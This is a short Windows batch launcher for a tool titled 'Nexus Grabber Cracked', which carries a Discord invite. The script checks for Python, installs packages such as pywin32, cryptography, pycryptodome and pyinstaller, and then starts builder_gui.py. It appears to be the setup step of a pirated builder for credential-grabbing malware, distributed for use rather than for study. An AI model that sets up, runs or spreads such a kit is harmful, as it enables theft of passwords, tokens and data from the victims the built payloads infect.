@echo off
mode con: cols=180 lines=50
title Nexus Grabber Cracked - discord.gg/ARZSbuRE7m
echo.

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python 3.8+ from https://www.python.org/downloads/
    pause
    exit /b 1
)

echo [*] Python detected. Installing dependencies...
echo.

pip install customtkinter pillow pywin32 psutil cryptography requests pyinstaller pycryptodome
if %errorlevel% neq 0 (
    echo [!] Failed to install dependencies. Try running as Administrator.
    pause
    exit /b 1
)

echo [*] Dependencies installed successfully.
type acsii.txt
echo.

if exist "builder_gui.py" (
    python builder_gui.py
) else (
    echo [!] builder_gui.py not found!
    pause
    exit /b 1
)

